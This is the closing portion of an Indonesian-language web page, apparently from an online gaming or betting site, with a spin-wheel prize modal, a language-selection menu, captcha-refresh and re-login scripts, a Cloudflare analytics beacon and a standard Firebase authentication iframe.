              <div>untuk mendapatkan koin atau lainnya</div>
              
              <div class="spinWheel">
                <div class=" inline-flex" style="position: relative;">
                  <canvas id="wheelCanvas" width="280" height="280"></canvas>
                  <div class="spinWheelArrow"></div>
                </div>
              </div>
            </div>
			<div class="flex" style=" place-content: center; ">
                <button class="btn btn-block btn-primary " id="spinBtn">
				 Coba Keberuntungan Anda                </button>
            </div>
        </div>
	</div>
</div>
<div class="md-overlay"></div>
<!-- end of spin-wheel modal -->
  <script type="text/javascript" src="/assets/js/ugsports/app_mobile.js"> </script>
  <!--License TNC Modal -->
<!--License TNC Modal -->

<!--Language Option Modal -->
<div class="nifty-modal slide-in-bottom " id="langModal-mobile">
  <div class="md-content">
    <div class="md-body">
      <div class="wrap language">
        <div class="title">Wilayah dan bahasa</div>
        <table class="table-borderless"> 
        
          <tbody><tr>
            <td class="country">Indonesia</td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td class="flag-wrap">
              <div class="circle-id"></div>
            </td>
                        <td class="i  ">
            <a href="#" onclick="changeLang(&quot;id&quot;)"> indonesian</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;en&quot;)"> English</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;cn&quot;)"> Mandarin</a>
            </td>

                      </tr> 
     
        </tbody></table>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>
<!--END Language Option Modal -->
 
<script>
$(document).ready(function () {
  });
 function changeLang(key){
      change_lang(key)
  }
  $('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg .attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});



</script>





  

  <script type="text/javascript">
    $(document).ready(function(){
      if( window.location.href.indexOf('reLogin=yes') >= 0  &&  !window.isAuth){
        $("#btnToggleRSideNav").trigger('click');
      }
    });
  </script>

  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;733979b9c24043199561a4eac8bf2940&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>




<veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1771979141472" name="I0_1771979141472" src="https://api-kixplay-live1.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw&amp;appName=%5BDEFAULT%5D&amp;v=11.3.0&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.id.8ECc3i-niIA.O%2Fd%3D1%2Frs%3DAHpOoo8g466w4vfctJFQ7iHLN0dzTSqREg%2Fm%3D__features__#id=I0_1771979141472&amp;_gfid=I0_1771979141472&amp;parent=https%3A%2F%2FmerdekaMERCUSUAR77.site&amp;pfname=&amp;rpctoken=39952833" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe></body></html>